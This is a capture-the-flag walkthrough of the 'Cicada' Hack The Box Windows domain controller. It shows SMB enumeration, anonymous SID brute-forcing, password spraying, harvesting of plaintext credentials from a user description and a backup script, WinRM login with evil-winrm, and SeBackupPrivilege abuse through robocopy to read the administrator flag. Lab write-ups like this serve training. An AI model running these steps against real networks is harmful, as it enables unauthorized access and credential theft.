## NMAP SCAN
```
nmap -sSCV -p- 10.129.213.95                                                                                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-23 15:07 +0700
Nmap scan report for 10.129.213.95
Host is up (0.10s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-23 15:12:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-04-23T15:14:29+00:00; +6h59m58s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-23T15:14:29+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-04-23T15:14:29+00:00; +6h59m58s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-23T15:14:29+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49514/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 1s, median: 6h59m57s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-23T15:13:48
|_  start_date: N/A

```

```
smbclient -L //10.129.213.95/                                       
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```
lets check HR & DEV
```
mbclient //10.129.213.95/HR -U''
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 19:29:09 2024
  ..                                  D        0  Thu Mar 14 19:21:29 2024
  Notice from HR.txt                  A     1266  Thu Aug 29 00:31:48 2024

                4168447 blocks of size 4096. 459381 blocks available
smb: \> get Notice from HR.txt 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice
smb: \> get "Notice from HR.tx "
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice from HR.tx 
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```
got some notice by HR... cannot ls in DEV 

```
cat Notice\ from\ HR.txt      

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
got the pass but not the username.... 
```
nxc smb 10.129.213.95 -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
SMB         10.129.213.95   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.213.95   445    CICADA-DC        [+] cicada.htb\root:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
```
cicada.htb\root:Cicada$M6Corpb*@Lp#nZp!8
this is fake username...
```
impacket-lookupsid anonymous@10.129.213.95 -no-pass

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.213.95
[*] StringBinding ncacn_np:10.129.213.95[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```
got users 

```
nxc smb 10.129.213.95 -u HTB\ BOXES/Cicada/users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'  

SMB         10.129.213.95   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.213.95   445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.213.95   445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.213.95   445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.213.95   445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.213.95   445    CICADA-DC        [+] cicada.htb\michael.wringhtson:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
```
cicada.htb\michael.wringhtson:Cicada$M6Corpb*@Lp#nZp!8

lets enum more 
```
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Initializing FTP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         cicada.htb      445    CICADA-DC        [+] Enumerated domain user(s)
SMB         cicada.htb      445    CICADA-DC        cicada.htb\emily.oscars                   badpwdcount: 3 desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\david.orelious                 badpwdcount: 3 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         cicada.htb      445    CICADA-DC        cicada.htb\michael.wrightson              badpwdcount: 0 desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\sarah.dantelia                 badpwdcount: 3 desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\john.smoulder                  badpwdcount: 3 desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         cicada.htb      445    CICADA-DC        cicada.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         cicada.htb      445    CICADA-DC        cicada.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

 cicada.htb\david.orelious:Rt$Lp#7t*VQ!3
```
impacket-GetADUsers -all -dc-ip 10.129.213.95 'cicada.htb/david.orelious:aRt$Lp#7t*VQ!3'              
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Querying 10.129.213.95 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-08-27 03:08:03.186878  2026-04-23 22:06:42.510532 
Guest                                                 2024-08-29 00:26:56.662374  2024-03-15 13:18:24.017051 
krbtgt                                                2024-03-14 18:14:10.395299  <never>             
john.smoulder                                         2024-03-14 19:17:29.183818  <never>             
sarah.dantelia                                        2024-03-14 19:17:29.310232  <never>             
michael.wrightson                                     2024-03-14 19:17:29.373763  2026-04-23 23:00:24.088716 
david.orelious                                        2024-03-14 19:17:29.513848  2026-04-23 23:02:14.369720 
emily.oscars                                          2024-08-23 04:20:17.303714  <never>
```

now we know that michael, david, guest and admin are the users
but cannot winrm with david or michael
lets enum smb with david 

```
netexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares --smb-timeout 10

SMB         10.129.213.95   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.213.95   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.213.95   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.213.95   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.213.95   445    CICADA-DC        -----           -----------     ------
SMB         10.129.213.95   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.213.95   445    CICADA-DC        C$                              Default share
SMB         10.129.213.95   445    CICADA-DC        DEV             READ            
SMB         10.129.213.95   445    CICADA-DC        HR              READ            
SMB         10.129.213.95   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.213.95   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.213.95   445    CICADA-DC        SYSVOL          READ            Logon server share 
```

now I can read sysvol, netlogon IPC$ and DEV
```
smbclient //10.129.213.95/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'                      

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 19:31:39 2024
  ..                                  D        0  Thu Mar 14 19:21:29 2024
  Backup_script.ps1                   A      601  Thu Aug 29 00:28:22 2024
```

some backup script....
```
cat Backup_script.ps1   

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```
ok so we got pass for emily.oscars:Q!3@Lp#M6b*7t*Vt

```
evil-winrm -i 10.129.213.95 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
209700d45abf82ac51b5656e90738a86

```

so emily's winrm was working and got user flag

```
Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

```
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\> cd Users
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         3/14/2024   3:45 AM                3D Objects
d-r---         3/14/2024   3:45 AM                Contacts
d-r---         8/30/2024  10:06 AM                Desktop
d-r---         3/14/2024  10:20 PM                Documents
d-r---         3/14/2024   3:45 AM                Downloads
d-r---         3/14/2024   3:45 AM                Favorites
d-r---         3/14/2024   3:45 AM                Links
d-r---         3/14/2024   3:45 AM                Music
d-r---         3/14/2024   3:45 AM                Pictures
d-r---         3/14/2024   3:45 AM                Saved Games
d-r---         3/14/2024   3:45 AM                Searches
d-r---         3/14/2024   3:45 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

but we still cannot access roo.txt.... 
since we have backup privilege enable we can exploit it from win priv esc notes 
so the notes doesnt work lets try something else....  there is robocopy in the notes lets try that

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Downloads> robocopy /b "C:\Users\Administrator\Desktop" "C:\Users\Public" root.txt

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, April 23, 2026 9:34:07 AM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\Public\

    Files : root.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    C:\Users\Administrator\Desktop\
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        34        34         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :               2,833 Bytes/sec.
   Speed :               0.162 MegaBytes/min.
   Ended : Thursday, April 23, 2026 9:34:07 AM

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Downloads> cd C:\Users\Public
*Evil-WinRM* PS C:\Users\Public> dir


    Directory: C:\Users\Public


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         3/14/2024  12:40 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-r---          5/8/2021   1:20 AM                Videos
-ar---         4/23/2026   8:06 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Public> type root.txt
fc279550a0f4743bb8aa50581788f4a2

```

got the root flag